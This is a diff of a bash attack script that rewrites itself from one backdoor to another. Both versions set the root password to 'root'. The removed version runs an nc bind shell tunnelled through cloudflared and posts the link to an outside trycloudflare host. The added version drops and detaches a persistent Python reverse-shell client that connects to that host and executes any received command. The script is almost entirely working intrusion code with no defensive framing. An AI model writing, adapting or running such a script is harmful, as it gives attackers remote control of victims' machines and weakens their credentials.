@@ -1,31 +1,30 @@
 #!/bin/bash
-# 1. Credentials Takeover
+# 1. Total Takeover
 echo "root:root" | sudo chpasswd
 
-# 2. Setup Cloudflared
-if [ ! -f /tmp/cloudflared ]; then
-    curl -L --output /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
-    chmod +x /tmp/cloudflared
-fi
+# 2. Deploy the Persistent C2 Client
+cat <<EOF > /tmp/c2_client.py
+import socket, os, subprocess, time
+def connect():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # REPLACE with your Mac's Public IP or Cloudflare URL
+            s.connect(('merchandise-angeles-jade-stud.trycloudflare.com', 8080))
+            while True:
+                s.send((os.getcwd() + " # ").encode())
+                data = s.recv(1024).decode("utf-8").strip()
+                if not data or data == "exit": break
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                s.send(stdout + stderr)
+            s.close()
+        except:
+            time.sleep(5) # Persistence: Retry every 5 seconds
+if __name__ == "__main__":
+    connect()
+EOF
 
-# 3. Persistent Loop
-nohup bash -c "while true; do
-    # A. Ensure local listener is ready
-    if ! pgrep -x 'nc' > /dev/null; then
-        nohup nc -lkp 4444 -e /bin/bash > /dev/null 2>&1 &
-    fi
-
-    # B. Start TCP Tunnel (Avoids HTTP 502/530 errors)
-    if ! pgrep -f 'tcp://localhost:4444' > /dev/null; then
-        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell.log 2>&1 &
-    fi
-
-    sleep 15
-
-    # C. Exfiltrate the TCP link to your Mac
-    TCP_URL=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell.log | head -n 1)
-    if [ ! -z \"\$TCP_URL\" ]; then
-        curl -s -X POST -d \"SHELL_LINK: \$TCP_URL\" https://merchandise-angeles-jade-stud.trycloudflare.com
-    fi
-    sleep 10
-done" > /dev/null 2>&1 &
+# 3. Fire and Detach
+nohup python3 /tmp/c2_client.py > /dev/null 2>&1 &
+disown
